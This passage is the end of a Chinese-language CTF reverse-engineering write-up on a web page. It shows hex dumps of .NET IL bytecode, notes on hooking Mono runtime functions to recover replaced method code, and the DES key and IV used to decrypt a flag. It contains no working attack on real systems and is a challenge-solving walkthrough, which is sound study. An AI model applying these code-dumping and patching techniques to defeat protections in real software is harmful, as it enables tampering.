class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>0F<span class="hljs-symbol">\x</span>23<span class="hljs-symbol">\x</span>0D<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>0E<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>0D<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\x</span>1A<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\x</span>1A<span class="hljs-symbol">\x</span>0D<span class="hljs-symbol">\x</span>1A<span class="hljs-symbol">\x</span>0F<span class="hljs-symbol">\x</span>1A<span class="hljs-symbol">\x</span>0E<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>1C<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>1A<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>1A<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>1A<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>1A<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>1A<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>1A<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>1B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>1D<span class="hljs-symbol">\x</span>1A<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>1A<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>62<span class="hljs-symbol">\x</span>23<span class="hljs-symbol">\x</span>19<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>21</code></pre><p>然后按一次按钮后, 断mono_runtime_invoke, call mono_method_header_get_code拿到替换后的ilcode</p>
<pre class="hljs"><code><span class="hljs-symbol">\x</span>7E<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>38<span class="hljs-symbol">\x</span>1D<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>6F<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>1F<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>D1<span class="hljs-symbol">\x</span>8C<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>17<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>6F<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>3F<span class="hljs-symbol">\x</span>D7<span class="hljs-symbol">\x</span>FF<span class="hljs-symbol">\x</span>FF<span class="hljs-symbol">\x</span>FF<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>10<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>70<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>70<span class="hljs-symbol">\x</span>0D<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>6F<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>6F<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>6F<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>17<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>0B<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>0C<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>6F<span class="hljs-symbol">\x</span>0D<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>6F<span class="hljs-symbol">\x</span>0E<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>6F<span class="hljs-symbol">\x</span>0F<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>6F<span class="hljs-symbol">\x</span>0E<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>6F<span class="hljs-symbol">\x</span>10<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>6F<span class="hljs-symbol">\x</span>11<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>0A<span class="hljs-symbol">\x</span>2A</code></pre><p>文件里搜索替换一下就能拿到原先的encode逻辑</p>
<p class="img-container"><img src="https://i.imgur.com/F7DTn0R.png" alt=""></p>
<p>Des key : mono.dll,iv : mono.dll</p>
<p>解出flag</p>
<p class="img-container"><img src="https://i.imgur.com/YEech8n.png" alt=""></p>
        </article>
      </div>
    </div>
  </body>
</html>
<!--
    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
    Respective Copyrights apply.
 -->
